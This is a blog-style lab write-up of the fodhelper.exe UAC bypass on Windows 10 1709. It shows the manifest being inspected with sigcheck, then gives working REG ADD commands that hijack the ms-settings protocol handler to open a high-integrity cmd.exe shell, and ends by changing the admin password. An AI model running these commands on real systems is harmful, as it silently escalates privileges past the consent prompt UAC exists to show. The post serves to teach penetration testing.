---
description: >-
  (UAC) Bypass - fodhelper.exe
title: (UAC) Bypass - fodhelper.exe              # Add title here
date: 2023-01-23 08:00:00 -0600                           # Change the date to match completion date
categories: [04 Privilege Escalation, Windows - (UAC) Bypass - fodhelper.exe]                     # Change Templates to Writeup
tags: [uac bypass, fodhelper, windows privesc]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
UAC can be bypassed in various ways. This post is only a technique that allows an administrator user to bypass UAC by silently elevating our integrity level from medium to high.

Most of the publicly known UAC bypass techniques target a specific operating system version. In this case, the target is our lab client running Windows 10 build 1709. We will leverage an interesting UAC bypass based on fodhelper.exe, a Microsoft support application responsible for managing language changes in the operating system. Specifically, this application is launched whenever a local user selects the "Manage optional features" option in the "Apps & features" Windows Settings screen.

The fodhelper.exe binary runs as _high integrity_ on Windows 10 1709. We can leverage this to bypass UAC because of the way fodhelper interacts with the Windows Registry. More specifically, it interacts with registry keys that can be modified without administrative privileges.

In order to gather detailed information regarding the fodhelper integrity level and the permissions required to run this process, we will inspect its _application manifest_. The application manifest is an XML file containing information that lets the operating system know how to handle the program when it is started. We'll inspect the manifest with the sigcheck utility from Sysinternals, passing the -a argument to obtain extended information and -m to dump the manifest.

```powershell 
C:\> cd C:\Tools\privilege_escalation\SysinternalsSuite

C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe /accepteula -a -m C:\Windows\System32\fodhelper.exe

c:\windows\system32\fodhelper.exe:
        Verified:       Signed
        Signing date:   4:40 AM 9/29/2017
        Publisher:      Microsoft Windows
        Company:        Microsoft Corporation
        Description:    Features On Demand Helper
        Product:        Microsoft« Windows« Operating System
        Prod version:   10.0.16299.15
        File version:   10.0.16299.15 (WinBuild.160101.0800)
        MachineType:    32-bit
        Binary Version: 10.0.16299.15
        Original Name:  FodHelper.EXE
        Internal Name:  FodHelper
        Copyright:      ® Microsoft Corporation. All rights reserved.
        Comments:       n/a
        Entropy:        6.306
        Manifest:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- Copyright (c) Microsoft Corporation -->
<assembly
   xmlns="urn:schemas-microsoft-com:asm.v1"
   xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
   manifestVersion="1.0">
 <assemblyIdentity type="win32" publicKeyToken="6595b64144ccf1df" 
    name="Microsoft.Windows.FodHelper" version="5.1.0.0" 
    processorArchitecture="x86"/>
 <description>Features On Demand Helper UI</description>
 <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
  <security>
      <requestedPrivileges>
          <requestedExecutionLevel
            level="requireAdministrator"
          />
      </requestedPrivileges>
  </security>
 </trustInfo>
 <asmv3:application>
    <asmv3:windowsSettings 
      xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
        <dpiAware>true</dpiAware>
        <autoElevate>true</autoElevate>
    </asmv3:windowsSettings>
 </asmv3:application>
</assembly>
```

A quick look at the results shows that the application is meant to be run by administrative users and as such, requires the full administrator access token. Additionally, the _autoelevate_ flag is set to _true_, which allows the executable to auto-elevate to _high integrity_ without prompting the administrator user for consent.

This could allow us to hijack the execution through a properly formatted protocol handler. Let's try to add this key with the _REG_ utility:

```powershell
C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
The operation completed successfully.

C:\Users\admin>
```

Fodhelper.exe attempts to query a value (DelegateExecute) stored in our newly-created command key. Our hope is that when fodhelper discovers this empty value, it will follow the MSDN specifications for application protocols and will look for a program to launch specified in the Shell\\Open\\command\\Default key entry.

We will use REG ADD with the /v argument to specify the value name and /t to specify the type:

```powershell
C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
The operation completed successfully.
```

We'll set our new registry value. We'll also specify the new registry value with /d "cmd.exe" and /f to add the value silently.

```powershell
C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
The operation completed successfully.
```

After setting the value and running fodhelper.exe once again, we are presented with a command shell. The output of the whoami /groups command indicates that this is a high-integrity command shell. Next, we'll attempt to change the admin password to see if we can successfully bypass UAC:

```powershell
C:\Windows\system32> net user admin Ev!lpass
The command completed successfully.
```

The password change is successful and we have successfully bypassed UAC!